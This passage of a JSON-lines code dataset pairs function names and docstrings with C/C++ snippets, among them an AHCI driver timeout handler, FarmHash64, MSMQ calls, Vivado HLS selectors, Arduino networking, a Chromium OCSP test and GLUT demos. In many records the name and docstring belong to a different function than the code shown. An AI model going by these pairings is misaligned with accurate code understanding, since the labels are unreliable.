AHCI_SLOT_EXECUTING;\\n    else if ((ch->rslots & (1 << ccs)) == 0) {\\n      ch->wrongccs = 1;\\n      slot->state = AHCI_SLOT_EXECUTING;\\n    }\\n\\n    callout_reset_sbt(&slot->timeout, SBT_1MS * slot->ataio->timeout \/ 2, 0,\\n                      (timeout_t *)ahci_timeout, slot, 0);\\n    return;\\n  }\\n\\n  device_printf(dev, \"Timeout on slot %d port %d\\\\n\", slot->slot,\\n                slot->ataio->target_id & 0x0f);\\n  device_printf(dev,\\n                \"is %08x cs %08x ss %08x rs %08x tfd %02x \"\\n                \"serr %08x cmd %08x\\\\n\",\\n                ATA_INL(ch->r_mem, AHCI_P_IS), ATA_INL(ch->r_mem, AHCI_P_CI),\\n                ATA_INL(ch->r_mem, AHCI_P_SACT), ch->rslots,\\n                ATA_INL(ch->r_mem, AHCI_P_TFD), ATA_INL(ch->r_mem, AHCI_P_SERR),\\n                ATA_INL(ch->r_mem, AHCI_P_CMD));\\n\\n  \/* Handle frozen command. *\/\\n  \/\/ if (ch->frozen) {\\n  \/\/ \\tunion ccb *fccb = ch->frozen;\\n  \/\/ \\tch->frozen = NULL;\\n  \/\/ \\tfccb->ccb_h.status = CAM_REQUEUE_REQ | CAM_RELEASE_SIMQ;\\n  \/\/ \\tif (!(fccb->ccb_h.status & CAM_DEV_QFRZN)) {\\n  \/\/ \\t\\txpt_freeze_devq(fccb->ccb_h.path, 1);\\n  \/\/ \\t\\tfccb->ccb_h.status |= CAM_DEV_QFRZN;\\n  \/\/ \\t}\\n  \/\/ \\tahci_done(ch, fccb);\\n  \/\/ }\\n  if (ch->dev->GetMasterClass<AhciChannel>()->frozen) {\\n    PacketAtaio *packet = ch->dev->GetMasterClass<AhciChannel>()->frozen;\\n    ch->dev->GetMasterClass<AhciChannel>()->frozen = NULL;\\n    packet->status = CAM_REQUEUE_REQ | CAM_RELEASE_SIMQ;\\n    if (!(packet->status & CAM_DEV_QFRZN)) {\\n      ch->dev->GetMasterClass<AhciChannel>()->devq.Freeze(1);\\n      packet->status |= CAM_DEV_QFRZN;\\n    }\\n    ahci_done(ch, packet);\\n  }\\n  if (!ch->fbs_enabled && !ch->wrongccs) {\\n    \/* Without FBS we know real timeout source. *\/\\n    ch->fatalerr = 1;\\n    \/* Handle command with timeout. *\/\\n    ahci_end_transaction(&ch->slot[slot->slot], AHCI_ERR_TIMEOUT);\\n    \/* Handle the rest of commands. *\/\\n    for (i = 0; i < ch->numslots; i++) {\\n      \/* Do we have a running request on slot? *\/\\n      if (ch->slot[i].state < AHCI_SLOT_RUNNING) continue;\\n      ahci_end_transaction(&ch->slot[i], AHCI_ERR_INNOCENT);\\n    }\\n  } else {\\n    \/* With FBS we wait for other commands timeout and pray. *\/\\n    if (ch->toslots == 0)\\n      ch->dev->GetMasterClass<AhciChannel>()->devq.Freeze(1);\\n    \/\/ xpt_freeze_simq(ch->sim, 1);\\n    ch->toslots |= (1 << slot->slot);\\n    if ((ch->rslots & ~ch->toslots) == 0)\\n      ahci_process_timeout(ch);\\n    else\\n      device_printf(dev, \" ... waiting for slots %08x\\\\n\",\\n                    ch->rslots & ~ch->toslots);\\n  }\\n}'}","id":3574}
{"content":"{'function_name': 'HashLen16', 'docstring': '\/\/ Murmur-inspired hashing.\\r', 'code': 'uint64_t FarmHash64(const char *s, size_t len) {\\r\\n  const uint64_t seed = 81;\\r\\n  if (len <= 32) {\\r\\n    if (len <= 16) {\\r\\n      return HashLen0to16(s, len);\\r\\n    } else {\\r\\n      return HashLen17to32(s, len);\\r\\n    }\\r\\n  } else if (len <= 64) {\\r\\n    return HashLen33to64(s, len);\\r\\n  }\\r\\n\\r\\n  \/\/ For strings over 64 bytes we loop.  Internal state consists of\\r\\n  \/\/ 56 bytes: v, w, x, y, and z.\\r\\n  uint64_t x = seed;\\r\\n  uint64_t y = seed * k1 + 113;\\r\\n  uint64_t z = ShiftMix(y * k2 + 113) * k2;\\r\\n  pair<uint64_t, uint64_t> v = make_pair(0, 0);\\r\\n  pair<uint64_t, uint64_t> w = make_pair(0, 0);\\r\\n  x = x * k2 + Fetch64(s);\\r\\n\\r\\n  \/\/ Set end so that after the loop we have 1 to 64 bytes left to process.\\r\\n  const char* end = s + ((len - 1) \/ 64) * 64;\\r\\n  const char* last64 = end + ((len - 1) & 63) - 63;\\r\\n  assert(s + len - 64 == last64);\\r\\n  do {\\r\\n    x = Rotate64(x + y + v.first + Fetch64(s + 8), 37) * k1;\\r\\n    y = Rotate64(y + v.second + Fetch64(s + 48), 42) * k1;\\r\\n    x ^= w.second;\\r\\n    y += v.first + Fetch64(s + 40);\\r\\n    z = Rotate64(z + w.first, 33) * k1;\\r\\n    v = WeakHashLen32WithSeeds(s, v.second * k1, x + w.first);\\r\\n    w = WeakHashLen32WithSeeds(s + 32, z + w.second, y + Fetch64(s + 16));\\r\\n    std::swap(z, x);\\r\\n    s += 64;\\r\\n  } while (s != end);\\r\\n  uint64_t mul = k1 + ((z & 0xff) << 1);\\r\\n  \/\/ Make s point to the last 64 bytes of input.\\r\\n  s = last64;\\r\\n  w.first += ((len - 1) & 63);\\r\\n  v.first += w.first;\\r\\n  w.first += v.first;\\r\\n  x = Rotate64(x + y + v.first + Fetch64(s + 8), 37) * mul;\\r\\n  y = Rotate64(y + v.second + Fetch64(s + 48), 42) * mul;\\r\\n  x ^= w.second * 9;\\r\\n  y += v.first * 9 + Fetch64(s + 40);\\r\\n  z = Rotate64(z + w.first, 33) * mul;\\r\\n  v = WeakHashLen32WithSeeds(s, v.second * mul, x + w.first);\\r\\n  w = WeakHashLen32WithSeeds(s + 32, z + w.second, y + Fetch64(s + 16));\\r\\n  std::swap(z, x);\\r\\n  return HashLen16(HashLen16(v.first, w.first, mul) + ShiftMix(y) * k0 + z,\\r\\n                   HashLen16(v.second, w.second, mul) + x,\\r\\n                   mul);\\r\\n}'}","id":3578}
{"content":"{'function_name': 'mexCallFunctionUnsafe', 'docstring': '\/\/ call function and convert to mxArray', 'code': 'void mexCallFunctionUnsafe(std::function<R(Arg0, Args...)> func, int nlhs,\\n                           mxArray *plhs[], int nrhs, const mxArray *prhs[]) {\\n  \/\/ bind the first argument\\n  auto partially_applied = [&](Args &&... tail) {\\n    return std::move(func)(\\n        fromMexUnsafe(prhs[0], static_cast<FromMexType<Arg0> *>(nullptr)),\\n        std::forward<Args>(tail)...);\\n  };\\n\\n  \/\/ recursively call mexCallFunctionUnsafe with partially applied function\\n  return mexCallFunctionUnsafe(std::function<R(Args...)>{partially_applied},\\n                               nlhs, plhs, nrhs - 1, &prhs[1]);\\n}'}","id":3580}
{"content":"{'function_name': 'walk_dir', 'docstring': '\/\/\u83b7\u5f97\u76ee\u5f55\u4fe1\u606f', 'code': 'int main(int argc, char *argv[])\\n{\\n    sem_init(&my_sem, 0, 1);\\n    if (argc < 3)\\n    {\\n        cout << \"please give right path\" << endl;\\n        exit(0);\\n    }\\n    struct stat s;\\n    \/\/\u68c0\u67e5\u6587\u4ef6\u5939\u662f\u5426\u6709\u6821\\n    lstat(argv[1], &s);\\n    if (!S_ISDIR(s.st_mode))\\n    {\\n        cout << \"the source path is wrong\" << endl;\\n        exit(0);\\n    }\\n    \/\/\u68c0\u67e5\u76ee\u6807\u6587\u4ef6\u5939\u662f\u5426\u6709\u6548;\\n    lstat(argv[2], &s);\\n    if (!S_ISDIR(s.st_mode))\\n    {\\n        cout << \"the dest path is wrong\" << endl;\\n    }\\n    walk_dir(argv[1], argv[2]);\\n    vector<pthread_t> threads;\\n    threads.resize(NUM_OF_THREADS); \/\/\u8bbe\u7f6e\u7ebf\u7a0b\u6570\u76ee\\n    for (int i = 0; i < threads.size(); i++)\\n    {\\n        pthread_create(&threads[i], NULL, run, NULL);\\n    }\\n    for (int i = 0; i < threads.size(); i++)\\n    {\\n        pthread_join(threads[i], NULL);\\n    }\\n    return 0;\\n}'}","id":3584}
{"content":"{'function_name': 'RtpOpenQueue', 'docstring': '\/\/\\r', 'code': 'EXTERN_C\\r\\nHRESULT\\r\\nAPIENTRY\\r\\nMQCloseQueue(\\r\\n    IN QUEUEHANDLE hQueue\\r\\n    )\\r\\n{\\r\\n\\tif(g_fDependentClient)\\r\\n\\t\\treturn DepCloseQueue(hQueue);\\r\\n\\r\\n\\tHRESULT hr = RtpOneTimeThreadInit();\\r\\n\\tif(FAILED(hr))\\r\\n\\t\\treturn hr;\\r\\n\\r\\n    \/\/\\r\\n    \/\/ do not add try except here\\r\\n    \/\/ The API is implemented by NtClose() which returns an\\r\\n    \/\/ error on invalid handle (we return MQ_ERROR_INVALID_HANDLE)\\r\\n    \/\/ and throws exception on purpose when running under a debugger to help\\r\\n    \/\/ find errors at development time.\\r\\n    \/\/\\r\\n    hr = RTpConvertToMQCode(ACCloseHandle(hQueue));\\r\\n    return LogHR(hr, s_FN, 110);\\r\\n}'}","id":3585}
{"content":"{'function_name': 'Metronome', 'docstring': '\/\/ loop_stream_->set_source_end(beat_to_tick(1.0));', 'code': 'int main() {\\n  mu::PlayerRt player_rt;\\n  mu::Transport transport;\\n  \/\/ Metronome *metronome = new Metronome();\\n  Basic *basic = new Basic();\\n  Swish *swish = new Swish();\\n  mu::SumStream *mix = new mu::SumStream();\\n  mu::LoopStream *loop = new mu::LoopStream();\\n\\n  printf(\"1 beat = %ld ticks\\\\n\", beat_to_tick(1));\\n\\n  basic->add(0.00, \"thump.wav\", 1.0, -24.0);\\n  basic->add(1.50, \"thump.wav\", 1.0, -24.0);\\n  basic->add(3.00, \"thump.wav\", 1.0, -24.0);\\n  basic->add(4.00, \"thump.wav\", 1.0, -24.0);\\n  basic->add(5.50, \"thump.wav\", 1.0, -24.0);\\n  basic->add(7.50, \"thump.wav\", 0.5, -24.0);\\n\\n  swish->add(0.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(0.50, \"s21.wav\", 0.67, 0.60);\\n  swish->add(1.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(1.50, \"s21.wav\", 0.67, 0.60);\\n  swish->add(2.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(2.50, \"s21.wav\", 0.67, 0.60);\\n  swish->add(3.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(3.50, \"s21.wav\", 0.67, 0.60);\\n  swish->add(4.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(4.50, \"s21.wav\", 0.67, 0.60);\\n  swish->add(5.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(5.50, \"s21.wav\", 0.67, 0.60);\\n  swish->add(6.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(6.50, \"s21.wav\", 0.67, 0.60);\\n  swish->add(7.00, \"s21.wav\", 0.67, 0.60);\\n  swish->add(7.50, \"s21.wav\", 0.67, 0.60);\\n\\n  swish->add(0.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(0.75, \"s20.wav\", 0.67, 0.60);\\n  swish->add(1.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(1.75, \"s20.wav\", 0.67, 0.60);\\n  swish->add(2.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(2.75, \"s20.wav\", 0.67, 0.60);\\n  swish->add(3.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(3.75, \"s20.wav\", 0.67, 0.60);\\n  swish->add(4.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(4.75, \"s20.wav\", 0.67, 0.60);\\n  swish->add(5.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(5.75, \"s20.wav\", 0.67, 0.60);\\n  swish->add(6.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(6.75, \"s20.wav\", 0.67, 0.60);\\n  swish->add(7.25, \"s20.wav\", 0.67, 0.60);\\n  swish->add(7.75, \"s20.wav\", 0.67, 0.60);\\n\\n  swish->add(0.50, \"s14.wav\", 0.67, 0.50);\\n  swish->add(1.50, \"s14.wav\", 0.67, 0.50);\\n  swish->add(2.50, \"s14.wav\", 0.67, 0.50);\\n  swish->add(3.50, \"s14.wav\", 0.67, 0.50);\\n  swish->add(4.50, \"s14.wav\", 0.67, 0.50);\\n  swish->add(5.50, \"s14.wav\", 0.67, 0.50);\\n  swish->add(6.50, \"s14.wav\", 0.67, 0.50);\\n  swish->add(7.50, \"s14.wav\", 0.67, 0.50);\\n\\n  \/\/ mix->add_source(metronome->stream());\\n  mix->add_source(basic->stream());\\n  mix->add_source(swish->stream());\\n  loop->set_source(mix);\\n  loop->set_interval(beat_to_tick(8.0));\\n  loop->set_source_end(beat_to_tick(8.0));\\n\\n  \/\/ printf(\"mix:\\\\n%s\\\\n\", mix->inspect().c_str());\\n\\n  transport.set_player(&player_rt);\\n  transport.set_source(loop);\\n\\n  transport.run();\\n  wait_for_input();\\n  transport.stop();\\n  \\n  return 0;\\n}'}","id":3590}
{"content":"{'function_name': 'demosaicb_rd10_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd11_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd11 read pattern: { demosaicb_update_0[d0, d1] -> denoise[2d0, 1 + d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 1 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write0 = denoise.denoise_denoise_update_0_write0_merged_banks_9.peek_1();\\n  return value_denoise_denoise_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3592}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ Wait for connection', 'code': 'int sendNotify() \/\/client function to send\/receieve POST data.\\n{\\n    \\n  String str;\\n\\n  int returnStatus = 1;\\n\\n  str = printStatus();\\n\\n  if (temp != currentTemperature || hum != currentHumidity) {\\n\\n    currentTemperature = temp;\\n    currentHumidity = hum;\\n    \\n    if (client.connect(hubIp, hubPort)) {\\n       \\n      client.println(F(\"POST \/ HTTP\/1.1\"));\\n      client.print(F(\"HOST: \"));\\n      client.print(hubIp);\\n      client.print(F(\":\"));\\n      client.println(hubPort);\\n      client.println(\"Connection: close\");\\n      client.println(\"Content-Type: application\/json;\");\\n      client.print(\"Content-Length: \");\\n      client.println(str.length());\\n      client.println();\\n      client.println(str);\\n       \\n      Serial.println(\"Sending POST to ST HUB\");     \\n      \\n    } \\n    else {\\n\\n      Serial.println(\"Failed to connect to Hub!\");\\n      \/\/connection failed\\n      returnStatus = 0;\\n           \\n    }\\n  \\n  }\\n  else {\\n    Serial.println(\"No changes detected\");\\n\\n  }\\n\\n  \/\/ read any data returned from the POST\\n  while(client.connected() && !client.available()) delay(1); \/\/waits for data\\n  while (client.connected() || client.available()) { \/\/connected or data available\\n    char c = client.read();\\n  }\\n\\n  delay(1);\\n  client.stop();\\n  return returnStatus;\\n}'}","id":3593}
{"content":"{'function_name': 'MimeOleComputeContentBase', 'docstring': '\/\/ Did this come from the multipart related\\r', 'code': 'LPSTR MimeOleContentBaseFromBody(IMimeMessageTree *pTree, HBODY hBody)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    PROPVARIANT rVariant;\\r\\n\\r\\n    \/\/ Setup Variant\\r\\n    rVariant.vt = VT_LPSTR;\\r\\n    rVariant.pszVal = NULL;\\r\\n\\r\\n    \/\/ Get Content-Base first, and then try Content-Location\\r\\n    if (FAILED(pTree->GetBodyProp(hBody, PIDTOSTR(PID_HDR_CNTBASE), NOFLAGS, &rVariant)))\\r\\n    {\\r\\n        \/\/ Try Content-Location\\r\\n        if (FAILED(pTree->GetBodyProp(hBody, PIDTOSTR(PID_HDR_CNTLOC), NOFLAGS, &rVariant)))\\r\\n            rVariant.pszVal = NULL;\\r\\n    }\\r\\n\\r\\n    \/\/ Return\\r\\n    return rVariant.pszVal;\\r\\n}'}","id":3594}
{"content":"{'function_name': 'MarkDeviceForRemoval', 'docstring': '\/\/ END PROTECTED CODE\\r', 'code': 'VOID\\r\\nTerminateDeviceList(\\r\\n    VOID\\r\\n    )\\r\\n{\\r\\n    LIST_ENTRY * pentry;\\r\\n    ACTIVE_DEVICE*  pActiveDevice = NULL;\\r\\n\\r\\n    DBG_TRC((\"Destroying list of active devices\"));\\r\\n\\r\\n    if (!g_fDeviceListInitialized) {\\r\\n        return;\\r\\n    }\\r\\n\\r\\n    TAKE_CRIT_SECT t(g_DeviceListSync);\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Go through the list terminating devices\\r\\n    \/\/\\r\\n    while (!IsListEmpty(&g_DeviceListHead)) {\\r\\n\\r\\n        pentry = g_DeviceListHead.Flink;\\r\\n\\r\\n        \/\/\\r\\n        \/\/ Remove from the list ( reset list entry )\\r\\n        \/\/\\r\\n        RemoveHeadList(&g_DeviceListHead);\\r\\n        InitializeListHead( pentry );\\r\\n\\r\\n        pActiveDevice = CONTAINING_RECORD( pentry, ACTIVE_DEVICE,m_ListEntry );\\r\\n\\r\\n        \/\/ Destroy device object\\r\\n        \/\/ delete pActiveDevice;\\r\\n        pActiveDevice->Release();\\r\\n\\r\\n    }\\r\\n\\r\\n    g_fDeviceListInitialized = FALSE;\\r\\n}'}","id":3598}
{"content":"{'function_name': 'TEST_P', 'docstring': '\/\/ URLRequest caches certificate errors.', 'code': 'TEST_F(HTTPSHardFailTest, IntermediateResponseOldButStillValid) {\\n  if (!SystemSupportsOCSP()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support OCSP\";\\n    return;\\n  }\\n\\n  if (!SystemSupportsHardFailRevocationChecking()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support hard fail \"\\n                 << \"revocation checking\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n  cert_config.intermediate = EmbeddedTestServer::IntermediateType::kInHandshake;\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n  \/\/ Use an OCSP response for the intermediate that would be too old for a leaf\\n  \/\/ cert, but is still valid for an intermediate.\\n  cert_config.intermediate_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kLong}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(0u, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":3601}
{"content":"{'function_name': 'download', 'docstring': '\/* Read in file while the count is no 0xffff *\/', 'code': 'int message_callback(message_context_t * ctp, int type, unsigned flags,\\n\\t\\tvoid *handle) {\\n\\tserver_msg_t *msg;\\n\\tint num;\\n\\tchar msg_reply[255];\\n\\n\\t\/* cast a pointer to the message data *\/\\n\\tmsg = (server_msg_t *) ctp->msg;\\n\\n\\t\/* Print out some usefull information on the message *\/\\n\\t\/\/printf( \"\\\\n\\\\nServer Got Message:\\\\n\" );\\n\\t\/\/printf( \"  type: %d\\\\n\" , type );\\n\\t\/\/printf( \"  data: %s\\\\n\\\\n\", msg->msg_data );\\n\\tforce_sensor_data *data_0;\\n\\tforce_sensor_data *data_1;\\n\\tdata_0 = (force_sensor_data *) (Jr3BaseAddress0H + (Jr3DmAddrMask << 2));\\n\\tdata_1 = (force_sensor_data *) (Jr3BaseAddress1H + (Jr3DmAddrMask << 2));\\n\\n\\t\/* Build the reply message *\/\\n\\tnum = type - _IO_MAX;\\n\\tswitch (num) {\\n\\tcase 1:\\t\\t\\t\/\/ get data\\n\\t{\\n\\t\\tfloat tmp[12] = { -1.0 * (float) data_0->filter0.fx\\n\\t\\t\\t\\t\/ (float) data_0->full_scale.fx, -1.0\\n\\t\\t\\t\\t* (float) data_0->filter0.fy \/ (float) data_0->full_scale.fy,\\n\\t\\t\\t\\t-1.0 * (float) data_0->filter0.fz\\n\\t\\t\\t\\t\\t\\t\/ (float) data_0->full_scale.fz, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_0->filter0.mx\\n\\t\\t\\t\\t\\t\\t\/ (float) data_0->full_scale.mx * 0.1, \/\/ Newton*meter*10\\n\\t\\t\\t\\t-1.0 * (float) data_0->filter0.my\\n\\t\\t\\t\\t\\t\\t\/ (float) data_0->full_scale.my * 0.1, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_0->filter0.mz\\n\\t\\t\\t\\t\\t\\t\/ (float) data_0->full_scale.mz * 0.1, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_1->filter0.fx\\n\\t\\t\\t\\t\\t\\t\/ (float) data_1->full_scale.fx, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_1->filter0.fy\\n\\t\\t\\t\\t\\t\\t\/ (float) data_1->full_scale.fy, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_1->filter0.fz\\n\\t\\t\\t\\t\\t\\t\/ (float) data_1->full_scale.fz, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_1->filter0.mx\\n\\t\\t\\t\\t\\t\\t\/ (float) data_1->full_scale.mx * 0.1, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_1->filter0.my\\n\\t\\t\\t\\t\\t\\t\/ (float) data_1->full_scale.my * 0.1, -1.0\\n\\t\\t\\t\\t\\t\\t* (float) data_1->filter0.mz\\n\\t\\t\\t\\t\\t\\t\/ (float) data_1->full_scale.mz * 0.1 };\\n\\t\\tmemcpy(msg_reply, tmp, sizeof(float) * 12);\\n\\t}\\n\\t\\tbreak;\\n\\tcase 2:\\t\\t\\t\/\/ update offset\\n\\t\\tdata_0->offsets.fx += data_0->filter0.fx;\\n\\t\\tdata_0->offsets.fy += data_0->filter0.fy;\\n\\t\\tdata_0->offsets.fz += data_0->filter0.fz;\\n\\t\\tdata_0->offsets.mx += data_0->filter0.mx;\\n\\t\\tdata_0->offsets.my += data_0->filter0.my;\\n\\t\\tdata_0->offsets.mz += data_0->filter0.mz;\\n\\t\\tdata_1->offsets.fx += data_1->filter0.fx;\\n\\t\\tdata_1->offsets.fy += data_1->filter0.fy;\\n\\t\\tdata_1->offsets.fz += data_1->filter0.fz;\\n\\t\\tdata_1->offsets.mx += data_1->filter0.mx;\\n\\t\\tdata_1->offsets.my += data_1->filter0.my;\\n\\t\\tdata_1->offsets.mz += data_1->filter0.mz;\\n\\t\\tbreak;\\n\\tcase 3:\\t\\t\\t\/\/ set filter\\n\\t\\tbreak;\\n\\tcase 4:\\t\\t\\t\/\/ get data\\n\\t\\tget_force_sensor_info(data_0, msg_reply);\\n\\t\\tget_force_sensor_info(data_1, msg_reply + strlen(msg_reply));\\n\\t\\tbreak;\\n\\t}\\n\\n\\t\/* Send a reply to the waiting (blocked) client *\/\\n\\tMsgReply(ctp->rcvid, EOK, msg_reply, 256);\\n\\treturn 0;\\n}'}","id":3603}
{"content":"{'function_name': 'demosaicb_rd3_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd4_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd4 read pattern: { demosaicb_update_0[d0, d1] -> denoise[2d0, d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 964 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write0 = denoise.denoise_denoise_update_0_write0_merged_banks_9.peek_964();\\n  return value_denoise_denoise_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3604}
{"content":"{'function_name': 'requestEvent', 'docstring': '\/\/32 byte limit is in the Wire library, we have to live with it unless writing our own wire library', 'code': 'void receiveEvent( int bytesReceived)\\n{\\n\\n  \/\/LOGN(\"receive event, bytes: %d\" CR,bytesReceived);\\n  \\n  uint8_t  *ptr2;\\n\\n  counter = millis();\\n  sleep_disable();\\n \\n  for (int a = 0; a < bytesReceived; a++) {\\n    if (a < MAX_SENT_BYTES) {\\n      receivedCommands[a] = Wire.read();\\n      \/\/LOGN(\"received: %X\" CR, receivedCommands[a]);\\n    } else {\\n      Wire.read();  \/\/ if we receive more data then allowed just throw it away\\n    }\\n  }\\n  \\n  if (bytesReceived == 1){\\n    \/\/read address for a given register\\n    \/\/Addressing over the reg_map fallback to first byte\\n    if(bytesReceived == 1 && (receivedCommands[0] >= REG_MAP_SIZE)) {\\n      receivedCommands[0]=0;\\n    }\\n    \/\/LOGN(\"set register: %X\" CR,receivedCommands[0]);\\n    return;\\n  }\\n  \\n  if (bytesReceived == 2){\\n    \/\/ check for a command\\n    if (receivedCommands[0] == I2C_MANAGER_COMMAND) {\\n      \/\/LOGN(\"       received command: %X\" CR,receivedCommands[1]);\\n      new_command = receivedCommands[1]; return; }\\n  }\\n  \\n  \/\/More than 1 byte was received, so there is definitely some data to write into a register\\n  \/\/Check for writeable registers and discard data is it\\'s not writeable\\n\\n  \/\/LOGN(\"         check  writable buffer: %X %X %X\" CR,receivedCommands[0],I2C_PWM_MAP_WRITABLE,I2C_PWM_MAP_WRITABLE+REG_WRITABLE_MAP_SIZE);\\n  \\n  if ((receivedCommands[0]>=I2C_MANAGER_MAP_WRITABLE) && (receivedCommands[0] < (I2C_MANAGER_MAP_WRITABLE+REG_WRITABLE_MAP_SIZE))) {    \\n    if ((receivedCommands[0]+(unsigned int)(bytesReceived-1)) <= (I2C_MANAGER_MAP_WRITABLE+REG_WRITABLE_MAP_SIZE)) {\\n      \/\/Writeable registers\\n      \/\/ the two buffer should be in sync\\n      \/\/ptr1 = (uint8_t *)i2c_writabledataset1+receivedCommands[0]-I2C_MANAGER_MAP_WRITABLE;\\n      ptr2 = (uint8_t *)i2c_writabledataset2+receivedCommands[0]-I2C_MANAGER_MAP_WRITABLE;\\n      for (int a = 1; a < bytesReceived; a++) { \\n\\t\/\/LOGN(\"write in writable buffer: %X ,%X\" CR,a,receivedCommands[a]);\\n\\t\/\/*ptr1++ = receivedCommands[a];\\n\\t*ptr2++ = receivedCommands[a];\\n      }\\n      \/\/ new data written\\n    }\\n  }\\n}'}","id":3609}
{"content":"{'function_name': 'lineclip', 'docstring': '\/\/cout<<code0<<\"  \"<<code1<<endl;', 'code': 'int main( int argc, char ** argv )\\n{\\n    glutInit( &argc, argv );\\n    printf(\"Please enter the lower corner and upper corner of window:\\\\n\");\\n    scanf(\"%d %d %d %d\", &xmin, &ymin, &xmax, &ymax);\\n    int n;\\n    cout<<\"enter number of line\"<<endl;\\n    cin>>nn;\\n     int k,l,m,e;\\n    for(int i=0;i<nn;i++)\\n    {\\n\\n        cin>>k>>l>>m>>e;\\n        vx.push_back(k);\\n        vy.push_back(l);\\n         cx.push_back(m);\\n        cy.push_back(e);\\n\\n    }\\n   \/\/ printf(\"Please enter the two points of line:\\\\n\");\\n   \/\/ scanf(\"%d %d %d %d\",&X1,&Y1,&X2,&Y2);\\n    glutInitWindowPosition( 0, 0 );\\n    glutInitWindowSize( 900, 700 );\\n    glutCreateWindow( \"1997\" );\\n    glMatrixMode( GL_PROJECTION );\\n    glLoadIdentity();\\n    gluOrtho2D( 0, 900, 0, 900 );\\n    glViewport(0, 0, 900, 900);\\n    glutDisplayFunc( myDisplay );\\n    glutKeyboardFunc(myKey);\\n    glutMainLoop();\\n    return( 0 );\\n}'}","id":3617}
{"content":"{'function_name': 'crossover', 'docstring': '\/*for(int i=0; i<8; i++){\\n            for(int j=0; j<8; j++){\\n                if(array2[j] == i){\\n                    printf(\"1 \");\\n                }else{\\n                    printf(\"0 \");\\n                }\\n            }\\n        printf(\"\\\\n\");\\n    }*\/', 'code': 'int main()\\n{\\n\\n    int array1[8];\\n    int array2[8];\\n\\n    srand(time(0));\\n\\n        for(int i=0; i<8; i++)\\n        {\\n\\n            int num = (rand() % 8 );\\n            array1[i] = num;\\n        }\\n\\n\\n\\n\\n        for(int i=0; i<8; i++)\\n        {\\n\\n            int num = (rand() % 8 );\\n            array2[i] = num;\\n        }\\n\\n    printf(\"First Random Array : \\\\n\");\\n    \/*for(int i=0; i<8; i++){\\n            for(int j=0; j<8; j++){\\n                if(array1[j] == i){\\n                    printf(\"1 \");\\n                }else{\\n                    printf(\"0 \");\\n                }\\n            }\\n        printf(\"\\\\n\");\\n    }*\/\\n    for(int i=0; i<8; i++){\\n        printf(\"%d \" , array1[i]);\\n    }\\n\\n\\n    printf(\"\\\\n\");\\n    